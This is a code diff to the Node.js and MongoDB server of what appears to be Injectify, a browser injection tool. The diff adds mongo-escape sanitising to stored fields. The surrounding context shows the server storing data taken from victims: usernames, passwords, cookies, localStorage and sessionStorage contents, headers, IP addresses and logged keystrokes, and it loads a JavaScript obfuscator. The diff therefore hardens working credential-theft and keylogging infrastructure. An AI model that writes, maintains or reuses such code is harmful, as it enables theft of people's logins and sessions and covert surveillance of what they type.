@@ -28,6 +28,7 @@ const ObfuscateJS	= require('js-obfuscator')
 const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
 const parseAgent	= require('user-agent-parser')
+const me			= require('mongo-escape').escape
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -143,7 +144,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								$push: {
 									logins: {
 										timestamp	: new Date(),
-										ip			: ipAddress,
+										ip			: me(ipAddress),
 										token		: token,
 										login_type	: loginMethod
 									}
@@ -154,8 +155,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						} else {
 							// User doesn't exist in database
 							users.insertOne({
-								username	: user.login,
-								id			: user.id,
+								username	: me(user.login),
+								id			: me(user.id),
 								payment		: {
 									account_type	: "free",
 									method			: "none"
@@ -163,7 +164,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 								github		: user,
 								logins		: [{
 									timestamp	: new Date(),
-									ip			: ipAddress,
+									ip			: me(ipAddress),
 									token		: token,
 									login_type	: loginMethod
 								}]
@@ -630,7 +631,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 												var c = {}
 												for (var i=0; i<pairs.length; i++){
 													var pair = pairs[i].split("=")
-													c[escapeUTF8(pair[0])] = unescape(pair[1])
+													c[pair[0]] = unescape(pair[1])
 												}
 											} else {
 												var c = record[cookies]
@@ -646,23 +647,23 @@ MongoClient.connect(config.mongodb, function(err, db) {
 											$push: {
 												passwords: {
 													timestamp	: new Date(),
-													username	: record[username],
-													password	: record[password],
+													username	: me(record[username]),
+													password	: me(record[password]),
 													url			: {
-														title: record[title],
-														href: record[url]
+														title: me(record[title]),
+														href: me(record[url])
 													},
 													ip			: ip,
 													browser: {
-														width		: record[width],
-														height		: record[height],
+														width		: me(record[width]),
+														height		: me(record[height]),
 														'user-agent': parseAgent(headers["user-agent"]),
-														headers		: headers
+														headers		: me(headers)
 													},
 													storage : {
-														local	: record[localStorage],
-														session	: record[sessionStorage],
-														cookies	: c
+														local	: me(record[localStorage]),
+														session	: me(record[sessionStorage]),
+														cookies	: me(c)
 													}
 												}
 											}
@@ -716,14 +717,14 @@ MongoClient.connect(config.mongodb, function(err, db) {
 													{
 														$push: {
 															keylogger: {
-																timestamp	: timestamp,
-																ip			: ip,
+																timestamp	: me(timestamp),
+																ip			: me(ip),
 																url			: {
-																	title: record[title],
-																	href: record[url]
+																	title: me(record[title]),
+																	href: me(record[url])
 																},
 																browser: {
-																	headers		: headers,
+																	headers		: me(headers),
 																	'user-agent': parseAgent(headers["user-agent"])
 																},
 																keys : keystrokes
